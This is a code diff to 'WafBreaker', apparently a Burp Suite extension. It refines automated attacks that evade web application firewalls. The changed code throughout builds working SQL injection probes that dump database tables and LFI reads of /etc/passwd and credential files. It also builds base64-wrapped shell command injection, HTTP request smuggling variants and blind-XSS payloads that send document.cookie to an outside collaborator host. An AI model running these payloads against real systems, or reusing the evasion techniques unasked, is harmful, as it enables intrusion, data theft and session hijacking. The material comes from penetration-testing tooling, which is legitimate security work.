@@ -2843,7 +2843,7 @@ def _load_categorized_sqli():
                             break
                     except Exception as _lcex:
                         import sys as _sys
-                        sys.stderr.write("[WafBreaker] _load_categorized_sqli: %s\n" % str(_lcex))
+                        _sys.stderr.write("[WafBreaker] _load_categorized_sqli: %s\n" % str(_lcex))
     for cat, fb in _FALLBACK.items():
         if not result[cat]:
             result[cat] = fb
@@ -3506,7 +3506,14 @@ def _systematic_cmdi(payload):
     try:
         cmd_part = re.search(r'[;|&]\s*(.+)', payload)
         if cmd_part:
-            cmd_b64 = _b64.b64encode(cmd_part.group(1).encode()).decode()
+            _cmd_raw = cmd_part.group(1)
+            # Explicit utf-8 encoding avoids UnicodeDecodeError on non-ASCII
+            # payload bytes in Python 2 where .encode() defaults to ASCII decode.
+            if isinstance(_cmd_raw, bytes):
+                _cmd_bytes = _cmd_raw
+            else:
+                _cmd_bytes = _cmd_raw.encode('utf-8')
+            cmd_b64 = _b64.b64encode(_cmd_bytes).decode('utf-8')
             _add(payload[:cmd_part.start(1)] + "$(echo %s|base64 -d|sh)" % cmd_b64,
                  "T6:b64_exec")
     except Exception:
@@ -3826,8 +3833,11 @@ def lfi_nginx_dbl_slash(path):
 def lfi_triple_encode(path):
     """Triple URL encoding"""
     try:
-        import urllib as _u3
-        return _u3.quote(_u3.quote(_u3.quote(path, safe=""), safe=""), safe="")
+        try:
+            from urllib.parse import quote as _url_quote  # Python 3
+        except ImportError:
+            from urllib import quote as _url_quote          # Python 2 / Jython
+        return _url_quote(_url_quote(_url_quote(path, safe=""), safe=""), safe="")
     except Exception:
         return path
 
@@ -3941,7 +3951,9 @@ LFI_CONFIRM_PATTERNS = [
     (r"HTTP_USER_AGENT",           "/proc/self/environ exposure"),
     (r"DOCUMENT_ROOT",             "/proc/self/environ web root"),
     (r"Linux version \d+\.\d+",    "kernel version string"),
-    (r"[A-Za-z0-9+/]{80,}={0,2}", "base64 blob (PHP wrapper success)"),
+    # Require 200+ chars so common JWTs / tracking IDs don't false-positive;
+    # use multiline anchor so the blob is line-level (file read context).
+    (r'(?m)^[A-Za-z0-9+/]{200,}={0,2}$', "base64 blob (PHP wrapper success)"),
     (r"-----BEGIN (?:RSA |OPENSSH |DSA |EC )?PRIVATE KEY",
                                      "SSH private key exposed"),
     (r"aws_access_key_id",           "AWS credentials file"),
@@ -4060,6 +4072,8 @@ class BurpExtender(IBurpExtender, IContextMenuFactory):
                         self.msg,
                         "SQL Injection",  # vuln_type placeholder (CWF is type-agnostic)
                         None,
+                        collab_host=self.ext._collab_host,
+                        collab_client=self.ext._collab_client,
                     )
                     eng._phase_custom_waf_fingerprint()
                     self.ext._p("[CWF] Custom WAF fingerprint scan complete. "
@@ -4093,7 +4107,9 @@ class BurpExtender(IBurpExtender, IContextMenuFactory):
                         self.ext.REQUEST_DELAY,
                         self.msg,
                         self.vtype,
-                        self.bnd
+                        self.bnd,
+                        collab_host=self.ext._collab_host,
+                        collab_client=self.ext._collab_client,
                     ).run()
                 except Exception as exc:
                     self.ext._cb.printOutput("[ERROR] " + str(exc))
@@ -4101,7 +4117,8 @@ class BurpExtender(IBurpExtender, IContextMenuFactory):
 
 class ScanEngine(object):
     JUNK_SIZE_BYTES = 135000
-    def __init__(self, callbacks, helpers, req_delay, message, vuln_type, bounds):
+    def __init__(self, callbacks, helpers, req_delay, message, vuln_type, bounds,
+                 collab_host=None, collab_client=None):
         self._cb        = callbacks
         self._h         = helpers
         self._delay     = req_delay
@@ -4110,6 +4127,9 @@ class ScanEngine(object):
         self._bounds    = bounds
         self._svc       = message.getHttpService()
         self._base_req  = message.getRequest()
+        # Burp Collaborator context forwarded from the extender singleton
+        self._collab_host   = collab_host
+        self._collab_client = collab_client
         self._waf_found = False
         self._bypass    = None
         self._req_count = 0
@@ -4198,7 +4218,8 @@ class ScanEngine(object):
                        json_body=False,
                        json_escape=False,
                        http_version=None,
-                       multipart_body=False):
+                       multipart_body=False,
+                       chunked_body=False):
         base = bytearray(self._base_req)
         try:
             try:
@@ -4265,9 +4286,12 @@ class ScanEngine(object):
             if sp != -1:
                 headers[0] = override_method + first[sp:]
         if extra_headers:
-            # Remove existing headers whose names clash with the injected ones,
-            # but always preserve the request-line (headers[0]).
-            names = frozenset(h.split(':')[0].lower() for h in extra_headers)
+            # Build the dedup set only from entries that contain a colon.
+            # A colon-free entry (malformed header) must not strip a legitimate
+            # existing header that shares the full string as its name prefix.
+            names = frozenset(
+                h.split(':')[0].lower() for h in extra_headers if ':' in h
+            )
             req_line = headers[0]
             headers = [req_line] + [
                 h for h in headers[1:]
@@ -4315,9 +4339,23 @@ class ScanEngine(object):
                 pass
         if multipart_body:
             try:
+                # Extract the real parameter name from the base request (same
+                # pattern as json_body) so the multipart field matches what the
+                # server expects instead of the hardcoded literal "data".
+                _mp_pname = "q"
+                try:
+                    _mp_analyzed = self._h.analyzeRequest(self._svc, bytes(self._base_req))
+                    _mp_params   = _mp_analyzed.getParameters()
+                    if _mp_params:
+                        for _mpp in _mp_params:
+                            if _mpp.getType() in (0, 1):
+                                _mp_pname = _mpp.getName()
+                                break
+                except Exception:
+                    pass
                 _mp_bnd = "----WafBreakerBoundary7x7"
-                _mp_hdr = ("--%s\r\nContent-Disposition: form-data; name=\"data\""
-                           "\r\n\r\n" % _mp_bnd).encode("utf-8")
+                _mp_hdr = ("--%s\r\nContent-Disposition: form-data; name=\"%s\""
+                           "\r\n\r\n" % (_mp_bnd, _mp_pname)).encode("utf-8")
                 _mp_ftr = ("\r\n--%s--\r\n" % _mp_bnd).encode("utf-8")
                 body = bytearray(_mp_hdr) + bytearray(body) + bytearray(_mp_ftr)
                 headers = [h for h in headers
@@ -4330,6 +4368,25 @@ class ScanEngine(object):
             try:
                 final = bytearray(bytes(final).replace(
                     b" HTTP/1.1\r\n", b" HTTP/1.0\r\n", 1))
+            except Exception:
+                pass
+        if chunked_body:
+            try:
+                # Re-encode body in chunked wire format so Transfer-Encoding:
+                # chunked headers added by the bypass are actually valid.
+                _crlf = bytearray(b"\r\n")
+                _analyzed_cb = self._h.analyzeRequest(final)
+                _cb_off = _analyzed_cb.getBodyOffset()
+                _cb_body = bytearray(final[_cb_off:])
+                _cb_hdrs = [str(h) for h in list(_analyzed_cb.getHeaders())]
+                # Build chunked body (1-byte chunk size by default)
+                _chunked = _chunked_encode(_cb_body, 1)
+                # Strip Content-Length, add Transfer-Encoding
+                _cb_hdrs_new = [h for h in _cb_hdrs
+                                if not h.lower().startswith("content-length:")]
+                if not any(h.lower().startswith("transfer-encoding:") for h in _cb_hdrs_new):
+                    _cb_hdrs_new.append("Transfer-Encoding: chunked")
+                final = self._h.buildHttpMessage(_cb_hdrs_new, bytes(_chunked))
             except Exception:
                 pass
         return self._fix_cl(final)
@@ -4451,7 +4508,9 @@ class ScanEngine(object):
     def _bypass_confidence(self, status, body):
         if self._blocked_baseline is None:
             return "Firm"
-        bl_len  = self._blocked_baseline.get("norm_len") or self._blocked_baseline["len"]
+        # Use explicit default=0 (not `or`) so norm_len==0 is handled correctly;
+        # `or` treats 0 as falsy and falls back to raw len, inconsistent with _is_blocked.
+        bl_len  = self._blocked_baseline.get("norm_len", 0)
         norm_cur = self._normalize_body_for_baseline(body)
         cur_len  = len(norm_cur)
         if status != self._blocked_baseline["status"]:
@@ -4464,7 +4523,9 @@ class ScanEngine(object):
                 return "Firm"
         return "Tentative"
     def _is_vuln(self, status, body):
-        if status not in (200, 201, 302, 301):
+        # Include 500 so error-based SQLi DB errors and LFI content reflected
+        # in PHP error pages are not silently classified as PASSED.
+        if status not in (200, 201, 301, 302, 500):
             return False
         for pat in SUCCESS_PATTERNS.get(self._vtype, []):
             if re.search(pat, body, re.IGNORECASE):
@@ -4649,11 +4710,14 @@ class ScanEngine(object):
             and self._response_differs(bf_s, bf_b)        # FALSE must differ
         )
         db_fp = [
-            ("AND 'foo' 'bar' = 'foobar'",    "MySQL / MariaDB"),
-            ("AND DATALENGTH('foo') = 3",      "MSSQL / SQL Server"),
-            ("AND TO_HEX(1) = '1'",            "PostgreSQL"),
-            ("AND LENGTHB('foo') = '3'",       "Oracle"),
-            ("AND GLOB('foo*', 'foobar') = 1", "SQLite"),
+            # Payloads start with ' to close string context and end with -- -
+            # to comment out the rest.  Without the leading quote these would
+            # produce syntax errors instead of matching the baseline.
+            ("' AND 'foo' 'bar' = 'foobar'-- -",    "MySQL / MariaDB"),
+            ("' AND DATALENGTH('foo') = 3-- -",      "MSSQL / SQL Server"),
+            ("' AND TO_HEX(1) = '1'-- -",            "PostgreSQL"),
+            ("' AND LENGTHB('foo') = '3'-- -",       "Oracle"),
+            ("' AND GLOB('foo*', 'foobar') = 1-- -", "SQLite"),
         ]
         db_variant = None
         self._log("[1.5] Fingerprinting DB variant (%d probes)..." % len(db_fp))
@@ -4912,7 +4976,7 @@ class ScanEngine(object):
         if all_pls:
             proof = ("<br><b>Proof payloads (each returned TRUE response):</b>"
                      "<pre style='font-size:11px'>%s</pre>"
-                     % '\n'.join(pl[:200] for pl in all_pls[:50]))
+                     % '\n'.join(_he(pl[:200]) for pl in all_pls[:50]))
         return (
             "<br><hr><b>BLIND EXTRACTION RESULTS</b><br>"
             "<table border='1' cellpadding='4' style='border-collapse:collapse'>"
@@ -5096,13 +5160,17 @@ class ScanEngine(object):
         if found_tables:
             for tbl in found_tables:
                 if any(k in tbl.lower() for k in _interesting):
+                    # Escape single quotes for the SQL WHERE clause; backtick-quote
+                    # the table name in the FROM clause to handle spaces/keywords.
+                    _tbl_sql = tbl.replace("'", "''")
+                    _tbl_bt  = "`%s`" % tbl.replace("`", "``")
                     col_probe = (
                         "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) "
-                        "FROM information_schema.columns WHERE table_name='%s'),0x7e))-- -" % tbl
+                        "FROM information_schema.columns WHERE table_name='%s'),0x7e))-- -" % _tbl_sql
                     )
                     col_union = (
                         "' UNION SELECT GROUP_CONCAT(column_name),NULL "
-                        "FROM information_schema.columns WHERE table_name='%s'-- -" % tbl
+                        "FROM information_schema.columns WHERE table_name='%s'-- -" % _tbl_sql
                     )
                     for clabel, cp in [("err", col_probe), ("union", col_union)]:
                         try:
@@ -5126,7 +5194,7 @@ class ScanEngine(object):
                                 # raising TypeError: must be real number, not str.
                                 dump_probe = (
                                     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT_WS('::%%7e',%s) "
-                                    "FROM %s LIMIT 1),0x7e))-- -" % (dump_cols, tbl)
+                                    "FROM %s LIMIT 1),0x7e))-- -" % (dump_cols, _tbl_bt)
                                 )
                                 kw2 = {}
                                 pp2, pkw2 = self._apply_bypass(dump_probe, kw2)
@@ -5191,7 +5259,7 @@ class ScanEngine(object):
                     "<tr><td><b>%s</b></td>"
                     "<td><code>%s</code></td>"
                     "<td>%s</td></tr>"
-                    % (lbl, _he(pp[:120]), _he(val))
+                    % (_he(lbl), _he(pp[:120]), _he(val))
                 )
             poc_html = (
                 "<br><b>POC Enumeration Results:</b><br>"
@@ -5324,6 +5392,8 @@ class ScanEngine(object):
                         _tp, _mx2,
                         _bd2[:600].replace("<", "&lt;").replace(">", "&gt;"),
                     ))
+                    self._log_payload("lfi-confirmed", _tp, _st2, "READ",
+                                      technique=_tname, note=_mx2[:60])
                     _working_depth = _depth
                     _working_tname = _tname
                     _working_tfunc = _tfunc
@@ -5366,6 +5436,8 @@ class ScanEngine(object):
                     _lbl, _tp3, _mx3,
                     _bd3[:600].replace("<", "&lt;").replace(">", "&gt;"),
                 ))
+                self._log_payload("lfi-confirmed", _tp3, _st3, "READ",
+                                  technique=_working_tname, note=_lbl)
         # Windows files (try backslash + forward-slash variants)
         for _wf in _LFI_WIN:
             for _sep, _slbl in [
@@ -5387,6 +5459,8 @@ class ScanEngine(object):
                         _slbl, _tp4, _mx4,
                         _bd4[:600].replace("<", "&lt;").replace(">", "&gt;"),
                     ))
+                    self._log_payload("lfi-confirmed", _tp4, _st4, "READ",
+                                      technique=_working_tname, note=_slbl)
         if not _confirmed:
             return
         # ── Build + file consolidated issue ────────────────────────────
@@ -5547,6 +5621,8 @@ class ScanEngine(object):
                 snippet = body[:600].replace('<', '&lt;').replace('>', '&gt;')
                 self._log("[+] LFI confirmed (raw): %s -- %s" % (file_label, match))
                 confirmed_files.append((file_label, file_path, match, snippet))
+                self._log_payload("lfi-confirmed", file_path, status,
+                                  "READ", technique="raw", note=file_label)
                 continue
             # -- all 28 encoding transforms --
             for (tname, tfunc, tdesc) in LFI_TAMPERS:
@@ -5579,7 +5655,10 @@ class ScanEngine(object):
         # PHP wrappers: raw only, no encoding
         # ------------------------------------------------------------------ #
         for (file_path, file_label, _skip) in php_only:
-            req = self._build_request(file_path)
+            # Apply the active bypass so header-level / method-override bypasses
+            # also cover PHP wrapper probes (previously these were sent raw).
+            fp_b, fkw_b = self._apply_bypass(file_path, {})
+            req = self._build_request(fp_b, **fkw_b)
             status, body = self._send(req)
             oc = self._outcome(status, body)
             self._report("[LFI php] " + file_label, file_path, status, body, oc)
@@ -5590,6 +5669,8 @@ class ScanEngine(object):
                 self._log("[+] LFI confirmed (PHP wrapper): %s -- %s"
                           % (file_label, match))
                 confirmed_files.append((file_label, file_path, match, snippet))
+                self._log_payload("lfi-confirmed", file_path, status,
+                                  "READ", technique="php-wrapper", note=file_label)
         # ------------------------------------------------------------------ #
         # Report
         # ------------------------------------------------------------------ #
@@ -5719,12 +5800,15 @@ class ScanEngine(object):
         _time_threshold_d = max(3000.0, baseline_ms + 2.0 * _bsig_d + 700.0)
         self._log("[T-DET] Time baseline: mean=%.0fms sigma=%.0fms threshold=%.0fms"
                   % (baseline_ms, _bsig_d, _time_threshold_d))
+        # Use 3-second sleeps so elapsed time clears the 3000 ms minimum
+        # threshold.  1-second probes always fall below the threshold and
+        # produce permanent false negatives in _sqli_type_detect.
         for time_probe in [
-            "' AND SLEEP(1)-- -",
-            "' OR SLEEP(1)-- -",
-            "1 AND SLEEP(1)-- -",
-            "'; WAITFOR DELAY '0:0:1'-- -",
-            "' AND pg_sleep(1)-- -",
+            "' AND SLEEP(3)-- -",
+            "' OR SLEEP(3)-- -",
+            "1 AND SLEEP(3)-- -",
+            "'; WAITFOR DELAY '0:0:3'-- -",
+            "' AND pg_sleep(3)-- -",
         ]:
             kw = {}
             pp, pkw = self._apply_bypass(time_probe, kw)
@@ -5824,6 +5908,9 @@ class ScanEngine(object):
             self._report("[CFM-BOOL] TRUE  (%s)"  % tier_name, t_base, st, bt, self._outcome(st, bt))
             self._report("[CFM-BOOL] FALSE (%s)" % tier_name, f_base, sf, bf, self._outcome(sf, bf))
             if self._is_blocked(st, bt) or self._is_blocked(sf, bf):
+                return False, 0
+            # TRUE response must NOT differ from the clean baseline (anti-FP guard)
+            if self._clean_baseline and self._response_differs(st, bt):
                 return False, 0
             diff = abs(len(bt) - len(bf))
             if diff > 30 or st != sf:
@@ -6016,6 +6103,9 @@ class ScanEngine(object):
                         _ext_data.get('db_name', ('?',))[0],
                         (", tables: " + ", ".join(_ext_tables)) if _ext_tables else ""
                     )) if _ext_data else ""
+                    # Set the guard BEFORE _add_issue so a Burp API exception
+                    # cannot leave the flag unset and allow duplicate filings.
+                    self._issued_high.add("SQL Injection")
                     self._add_issue(
                         "SQL Injection Confirmed -- %s [Bypass: %s]%s"
                         % (conf_type, tier_name, _title_suffix),
@@ -6029,7 +6119,6 @@ class ScanEngine(object):
                            conf_detail, _ext_html),
                         severity="High", confidence="Certain",
                     )
-                    self._issued_high.add("SQL Injection")
                     break
                 time.sleep(0.05)
         # -- S-2: Time-based --
@@ -6049,6 +6138,7 @@ class ScanEngine(object):
                     confirmed_p, elapsed_ms, db_hint = time_result
                     self._log("[S-2] CONFIRMED time %.0fms via %s tier %s"
                               % (elapsed_ms, db_hint, tier_name))
+                    self._issued_high.add("SQL Injection")
                     self._add_issue(
                         "SQL Injection Confirmed -- Time-Based Blind [Bypass: %s]" % tier_name,
                         "WafBreaker confirmed <b>Time-Based Blind SQL Injection</b>.<br><br>"
@@ -6061,7 +6151,6 @@ class ScanEngine(object):
                         % (tier_name, base_p[:300], mutated[:300], confirmed_p[:300], db_hint, elapsed_ms),
                         severity="High", confidence="Certain",
                     )
-                    self._issued_high.add("SQL Injection")
                     break
                 time.sleep(0.05)
         # -- S-3: UNION-based --
@@ -6083,6 +6172,7 @@ class ScanEngine(object):
                     confirmed_p, extracted_val, db_hint = union_result
                     self._log("[S-3] CONFIRMED UNION '%s' via %s tier %s"
                               % (extracted_val, db_hint, tier_name))
+                    self._issued_high.add("SQL Injection")
                     self._add_issue(
                         "SQL Injection Confirmed -- UNION-Based [Bypass: %s]" % tier_name,
                         "WafBreaker confirmed <b>UNION-Based SQL Injection</b>.<br><br>"
@@ -6096,7 +6186,6 @@ class ScanEngine(object):
                            confirmed_p[:300], db_hint, extracted_val),
                         severity="High", confidence="Certain",
                     )
-                    self._issued_high.add("SQL Injection")
                     break
                 time.sleep(0.05)
         # -- S-4: Stacked queries --
@@ -6129,6 +6218,7 @@ class ScanEngine(object):
                 if _stk_time or _stk_err:
                     _stk_conf_label   = "Time-Based" if _stk_time else "Error-Based"
                     _stk_conf_payload = (_stk_time[0] if _stk_time else _stk_err[0])
+                    self._issued_high.add("SQL Injection")
                     self._add_issue(
                         "SQL Injection Confirmed -- Stacked Queries [Bypass: %s]" % _stk_tier,
                         "WafBreaker confirmed <b>Stacked Query SQL Injection</b>.<br><br>"
@@ -6139,7 +6229,6 @@ class ScanEngine(object):
                         % (_stk_tier, _stk_p[:300], _stk_conf_label, _stk_conf_payload[:300]),
                         severity="High", confidence="Certain",
                     )
-                    self._issued_high.add("SQL Injection")
                     break
         self._log("[Phase S complete]")
     def run(self):
@@ -6442,7 +6531,7 @@ class ScanEngine(object):
         _gap     = _avg_lhi - _avg_l0
 
         _hi_blocked     = sum(1 for _r in _blocked if _r[0] >= 2)
-        _conf_score     = min(5, max(1, int(_gap * 1.5) + _hi_blocked // 2))
+        _conf_score     = min(5, max(0, int(_gap * 1.5) + _hi_blocked // 2))
 
         if _conf_score < 1 or len(_blocked) < 2:
             self._log("[CWF] Evidence insufficient (conf=%d, blocked=%d) "
@@ -6540,9 +6629,12 @@ class ScanEngine(object):
         # 4e: WAF-flavoured CSS id/class attribute values
         _WAF_ATTR_RE = re.compile(
             r'(?:id|class)=["\']([^"\']{4,60})["\']', re.IGNORECASE)
+        # Word boundaries prevent CSS utility class substrings (e.g. "section",
+        # "blockquote", "secondary") from generating false-positive WAF patterns.
         _WAF_KW_RE   = re.compile(
-            r'(?:block|deny|forbid|restrict|protect|waf|firewall|guard|'
-            r'sec(?:urity)?|shield|wall|barrier|captcha|challenge)',
+            r'(?:\bblock\b|\bdeny\b|\bforbid\b|\brestrict\b|\bprotect\b|\bwaf\b|'
+            r'\bfirewall\b|\bguard\b|\bsec(?:urity)?\b|\bshield\b|\bwall\b|'
+            r'\bbarrier\b|\bcaptcha\b|\bchallenge\b)',
             re.IGNORECASE)
         for _am in _WAF_ATTR_RE.finditer(_primary_body):
             _av = _am.group(1).strip()
@@ -6754,7 +6846,9 @@ class ScanEngine(object):
         """
         _MK_S = "WBP__"   # sentinel start (5 chars, not valid SQL/HTML)
         _MK_E = "__WBP"   # sentinel end
-        _MK_RE = re.compile(re.escape(_MK_S) + r'([^<>\s]{1,200})' + re.escape(_MK_E))
+        # [^<>] instead of [^<>\s] so DB version strings with spaces (e.g.
+        # "8.0.26-MySQL Community Server - GPL") are captured in full.
+        _MK_RE = re.compile(re.escape(_MK_S) + r'([^<>]{1,200})' + re.escape(_MK_E))
 
         # (key, expr_mysql, expr_mssql, expr_pgsql, expr_oracle)
         # We build CONCAT-style payloads per dialect and also plain fallbacks.
@@ -6806,19 +6900,22 @@ class ScanEngine(object):
             r')',
             re.IGNORECASE)
         # DB names: 3-40 chars, NOT common HTML/JS words
+        # Removed 'main' (SQLite default schema), 'data', 'content', 'text',
+        # 'title', 'label' -- all valid production DB names that would be
+        # silently filtered out.  Keep pure HTML/JS/CSS terms only.
         _DB_NOISE = frozenset([
             "html","head","body","div","script","table","form","input","select",
             "option","button","span","meta","link","img","href","class","type",
             "function","return","var","let","const","true","false","null",
-            "undefined","content","style","title","header","footer","section",
-            "article","nav","main","aside","data","text","width","height",
+            "undefined","style","header","footer","section",
+            "article","nav","aside","width","height",
             "color","font","size","margin","padding","border","background",
             "display","position","float","none","solid","center","left",
             "right","top","bottom","middle","normal","bold","italic",
-            "container","wrapper","page","row","col","btn","icon","logo",
-            "menu","list","item","box","card","panel","modal","alert",
-            "badge","label","image","video","iframe","canvas","time",
-            "address","code","pre","blockquote","cite","abbr","samp",
+            "container","wrapper","page","col","btn","icon","logo",
+            "menu","list","item","box","card","panel","modal",
+            "badge","image","video","iframe","canvas",
+            "address","pre","blockquote","cite","abbr","samp",
             "the","and","for","not","from","with","have","this","that",
         ])
         _DB_RE = re.compile(r'\b([a-z][a-z0-9_]{2,39})\b', re.IGNORECASE)
@@ -6882,7 +6979,9 @@ class ScanEngine(object):
             "../../../../../../etc/passwd",
             "/etc/passwd",
         ]
-        _PASSWD_RE = re.compile(r'root:x?:0:0:')
+        # Covers Linux (root:x:0:0:), BSD/macOS (root:*:0:0:),
+        # SLES/RHEL locked account (root:!:0:0:), and inline hashes.
+        _PASSWD_RE = re.compile(r'root:[^:]*:0:0:')
         for _pl in _LFI_PLS:
             try:
                 _p, _kw = self._apply_bypass(_pl, {})
@@ -6904,8 +7003,8 @@ class ScanEngine(object):
             # Linux
             "; id",  "| id",  "& id",  "`id`",  "$(id)",
             "; whoami",  "| whoami",  "& whoami",
-            # Windows
-            "& whoami",  "| whoami /all",  "; whoami /all",
+            # Windows (& whoami was duplicated here -- replaced with net user)
+            "& net user",  "| whoami /all",  "; whoami /all",
             "& cmd /c whoami",
         ]
         # Linux: uid=0(root) gid=0(root)
@@ -7237,8 +7336,11 @@ class ScanEngine(object):
         def _p0_mp(p):    return p, {"multipart_body": True}
         def _p0_denc(p):
             try:
-                import urllib as _ul0
-                return _ul0.quote(p, safe="").replace("%", "%25"), {}
+                try:
+                    from urllib.parse import quote as _p0_quote  # Python 3
+                except ImportError:
+                    from urllib import quote as _p0_quote          # Python 2 / Jython
+                return _p0_quote(p, safe="").replace("%", "%25"), {}
             except Exception:
                 return p, {}
         _p0_variants = [
@@ -7484,11 +7586,15 @@ class ScanEngine(object):
             self._report("[Bypass] Chunked TE (%s)" % _clabel, probe, status, body, oc)
             if not self._is_blocked(status, body) and not self._bypass:
                 self._log("[+] Chunked TE bypass WORKED: %s" % _clabel)
+                # Store as chunked_body so _apply_bypass re-encodes the body
+                # on every subsequent request.  Storing as 'header' only would
+                # add the TE header but leave the body un-chunked (RFC 7230 violation).
                 self._bypass = {
-                    "type":    "header",
+                    "type":    "chunked_body",
                     "headers": ["Transfer-Encoding: chunked",
                                 "Content-Type: application/x-www-form-urlencoded"],
                     "name":    "chunked-te-" + _clabel,
+                    "variant": _clabel,
                 }
         self._log("[2-I] HTTP Parameter Pollution (true param duplication)...")
         _hpp_param = "waf"
@@ -7642,19 +7748,26 @@ class ScanEngine(object):
                 _tc_inner = ("%X\r\n%s\r\n0\r\n\r\n"
                              % (len(_smug_payload), _smug_payload)).encode('utf-8')
                 _tc_body   = bytearray(_tc_inner)
+                # CL must cover only the first chunk-size line (hex digits + CRLF)
+                # so the payload chunk is smuggled as the back-end request suffix.
+                _tc_cl = len("%X" % len(_smug_payload)) + 2
                 _smug_variants.append((
                     ["Transfer-Encoding: chunked",
-                     "Content-Length: %d" % (len(_tc_body) - len(_smug_payload) - 10)],
+                     "Content-Length: %d" % _tc_cl],
                     _tc_body,
                     "TE.CL",
                 ))
             except Exception:
                 pass
             try:
-                _ct_inner = ("X\r\n%s\r\n0\r\n\r\n" % _smug_payload).encode('utf-8')
+                # CL.TE: CL covers the whole outer body; TE:chunked is the
+                # real framing header so the WAF uses CL while the back-end
+                # uses TE.  Use a valid hex chunk-size.
+                _ct_inner = ("%X\r\n%s\r\n0\r\n\r\n"
+                             % (len(_smug_payload), _smug_payload)).encode('utf-8')
                 _ct_body   = bytearray(_ct_inner)
                 _smug_variants.append((
-                    ["Content-Length: 3",
+                    ["Content-Length: %d" % len(_ct_body),
                      "Transfer-Encoding: chunked"],
                     _ct_body,
                     "CL.TE",
@@ -7689,6 +7802,9 @@ class ScanEngine(object):
                             "type":    "smuggling",
                             "name":    "smuggling-" + _smug_label,
                             "variant": _smug_label,
+                            # Store the actual conflicting headers so _apply_bypass
+                            # can inject them on every subsequent Phase 3+ request.
+                            "headers": _smug_hdrs,
                         }
                         self._add_issue(
                             "Potential HTTP Request Smuggling -- %s" % self._vtype,
@@ -7774,8 +7890,11 @@ class ScanEngine(object):
         if not self._bypass:
             self._log("[2-T] Double URL encoding bypass...")
             try:
-                import urllib as _ul_t
-                _denc_probe = _ul_t.quote(probe, safe="").replace("%", "%25")
+                try:
+                    from urllib.parse import quote as _ul_t_quote  # Python 3
+                except ImportError:
+                    from urllib import quote as _ul_t_quote          # Python 2 / Jython
+                _denc_probe = _ul_t_quote(probe, safe="").replace("%", "%25")
                 req = self._build_request(_denc_probe)
                 status, body = self._send(req)
                 oc = self._outcome(status, body)
@@ -8091,7 +8210,12 @@ class ScanEngine(object):
         if not self._bypass:
             return payload, kwargs
         btype = self._bypass["type"]
-        if btype == "header":
+        if btype == "chunked_body":
+            # Add TE headers AND request body re-encoding.  'header' type only
+            # adds headers, which leaves the body as plain text — invalid with TE:chunked.
+            kwargs["extra_headers"] = self._bypass.get("headers", [])
+            kwargs["chunked_body"]  = True
+        elif btype == "header":
             kwargs["extra_headers"] = self._bypass["headers"]
         elif btype == "charset_ibm037":
             payload = ibm037_encode(payload)
@@ -8107,8 +8231,8 @@ class ScanEngine(object):
         elif btype == "tamper":
             try:
                 payload = self._bypass["func"](payload)
-            except Exception:
-                pass
+            except Exception as _te:
+                self._log("[bypass] tamper transform failed: %s" % str(_te))
         elif btype == "lfi_encoding":
             try:
                 payload = self._bypass["func"](payload)
@@ -8148,8 +8272,11 @@ class ScanEngine(object):
             payload = payload + self._bypass.get("suffix", "&_=1")
         elif btype == "double_encode":
             try:
-                import urllib as _ul
-                _enc = _ul.quote(payload, safe="")
+                try:
+                    from urllib.parse import quote as _dbl_quote  # Python 3
+                except ImportError:
+                    from urllib import quote as _dbl_quote          # Python 2 / Jython
+                _enc = _dbl_quote(payload, safe="")
                 payload = _enc.replace("%", "%25")
             except Exception:
                 pass
@@ -8160,7 +8287,11 @@ class ScanEngine(object):
         return payload, kwargs
     def _detect_xss_context(self, probe_marker="ENIMARKER7x7"):
         try:
-            req = self._build_request(probe_marker)
+            # Apply the active bypass so the probe is not blocked by the WAF.
+            # Without this, the probe is always blocked when a WAF is present,
+            # returning "unknown" and bypassing all context-aware payload selection.
+            _pp, _pkw = self._apply_bypass(probe_marker, {})
+            req = self._build_request(_pp, **_pkw)
             s, b = self._send(req)
             if probe_marker not in b:
                 return "unknown"
@@ -8168,8 +8299,12 @@ class ScanEngine(object):
             before = b[max(0, idx-100):idx]
             after  = b[idx+len(probe_marker):idx+len(probe_marker)+80]
             if re.search(r"<script[^>]*>.*$", before, re.IGNORECASE | re.DOTALL):
-                if re.search(r"""['"][^'"]*$""", before):
-                    return "js_string"
+                # Odd count of a given quote char means the injection is inside
+                # an unclosed string literal of that quote type.  Even count
+                # means the string is closed — return js_block instead.
+                for _q in ("'", '"'):
+                    if before.count(_q) % 2 == 1:
+                        return "js_string"
                 return "js_block"
             if re.search(r"""[a-zA-Z_-]+=(['"])[^'"]*$""", before):
                 return "html_attr"
@@ -8784,7 +8919,9 @@ class ScanEngine(object):
                 )
                 s, b = self._send(req)
                 oc = self._outcome(s, b)
-                self._report("[HdrInject] %s" % hdr, probe, s, b, oc)
+                # Log pp (the bypass-transformed value) not probe, so analysts
+                # reproduce the exact request that confirmed the injection.
+                self._report("[HdrInject] %s" % hdr, pp, s, b, oc)
                 if oc == "VULN!":
                     found_in_header.append(hdr)
                     self._log("[+] Header injection confirmed in: %s" % hdr)
@@ -8819,7 +8956,9 @@ class ScanEngine(object):
             "<iframe src=//%s/bxss></iframe>" % collab_host,
             "<script>fetch('//%s/bxss?u='+location.href)</script>" % collab_host,
             "<img src=x onerror=\"var s=document.createElement('script');s.src='//%s/bxss';document.head.appendChild(s)\">" % collab_host,
-            "javascript:/*--></title></style></textarea></script></xmp>",
+            # Replaced the non-OOB polyglot (no collaborator callback) with a
+            # context-breaking variant that includes an OOB load.
+            "</script><script>new Image().src='//%s/bxss?p=polyglot'</script>" % collab_host,
             "<svg/onload='new Image().src=\"//%s/bxss?c=\"+document.cookie'//>" % collab_host,
         ]
         sent_payloads = []
